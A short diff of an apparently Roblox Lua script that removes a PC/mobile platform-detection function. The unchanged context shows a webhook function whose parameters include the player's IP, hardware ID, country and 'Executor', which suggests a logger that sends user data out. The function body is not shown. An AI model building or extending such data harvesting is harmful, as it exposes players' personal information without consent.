@@ -28,16 +28,7 @@ end
 
 local GameIcon = getGameIcon()
 
--- Determine if the Player is on PC or Mobile
-local function getPlatform()
-    if UserInputService.TouchEnabled then
-        return "Mobile"
-    else
-        return "PC"
-    end
-end
 
-local Platform = getPlatform()
 
 -- Webhook Message Sending Function
 local function SendMessage(url, Username, HWID, Executor, IP, GameID, JobID, Country, PlayerAvatar, GameIcon, ServerLocation, Platform)
